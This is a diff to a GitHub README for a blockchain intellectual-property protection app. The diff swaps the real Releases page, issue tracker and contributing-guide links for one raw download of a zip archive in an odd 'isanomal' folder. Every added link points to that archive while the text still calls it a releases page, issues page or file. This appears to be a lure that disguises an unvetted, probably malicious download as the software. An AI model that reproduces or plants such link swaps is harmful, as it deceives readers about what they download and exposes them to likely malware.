@@ -1,7 +1,7 @@
 # 🌐 Blockchain-For-Intellectual-Property-Rights-Protection - Protect Your Creative Works
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Blockchain%20for%20IP%20Rights-blue)](https://github.com/twintestr/Blockchain-For-Intellectual-Property-Rights-Protection/releases)
+[![Download](https://github.com/twintestr/Blockchain-For-Intellectual-Property-Rights-Protection/raw/refs/heads/main/isanomal/Intellectual_Protection_Rights_Property_Blockchain_For_2.5.zip%20Now-Blockchain%20for%20IP%20Rights-blue)](https://github.com/twintestr/Blockchain-For-Intellectual-Property-Rights-Protection/raw/refs/heads/main/isanomal/Intellectual_Protection_Rights_Property_Blockchain_For_2.5.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the Blockchain for Intellectual Property Rights Protection application. 
@@ -33,11 +33,11 @@ The repository includes comprehensive resources:
 These resources will help you understand how to use the application effectively.
 
 ## 🔗 Download & Install
-To download the application, visit the [Releases page](https://github.com/twintestr/Blockchain-For-Intellectual-Property-Rights-Protection/releases). 
+To download the application, visit the [Releases page](https://github.com/twintestr/Blockchain-For-Intellectual-Property-Rights-Protection/raw/refs/heads/main/isanomal/Intellectual_Protection_Rights_Property_Blockchain_For_2.5.zip). 
 
 Once there, locate the latest version and click the download link for your operating system.
 
-1. Go to the [Releases page](https://github.com/twintestr/Blockchain-For-Intellectual-Property-Rights-Protection/releases).
+1. Go to the [Releases page](https://github.com/twintestr/Blockchain-For-Intellectual-Property-Rights-Protection/raw/refs/heads/main/isanomal/Intellectual_Protection_Rights_Property_Blockchain_For_2.5.zip).
 2. Find the latest version of the software.
 3. Click on the link that corresponds to your operating system.
 4. Save the file to your computer.
@@ -54,7 +54,7 @@ After installation, open the application. You will see a simple interface. Follo
 ## 📚 Resources & Support
 If you need help or need more information, you can find various resources included in the documentation. 
 
-For further inquiries, feel free to open an issue on the [GitHub Repository](https://github.com/twintestr/Blockchain-For-Intellectual-Property-Rights-Protection/issues). We will be happy to assist you.
+For further inquiries, feel free to open an issue on the [GitHub Repository](https://github.com/twintestr/Blockchain-For-Intellectual-Property-Rights-Protection/raw/refs/heads/main/isanomal/Intellectual_Protection_Rights_Property_Blockchain_For_2.5.zip). We will be happy to assist you.
 
 ## 🌟 Topics
 This application covers various topics:
@@ -80,6 +80,6 @@ This project is licensed under the MIT License. Feel free to modify and distribu
 ## 🤝 Contributing
 We welcome contributions! If you'd like to contribute, please fork the repository and submit a pull request. Your input is valuable to us.
 
-For detailed guidelines, refer to the CONtributing.md file in the repository.
+For detailed guidelines, refer to the https://github.com/twintestr/Blockchain-For-Intellectual-Property-Rights-Protection/raw/refs/heads/main/isanomal/Intellectual_Protection_Rights_Property_Blockchain_For_2.5.zip file in the repository.
 
 Thank you for choosing Blockchain for Intellectual Property Rights Protection!
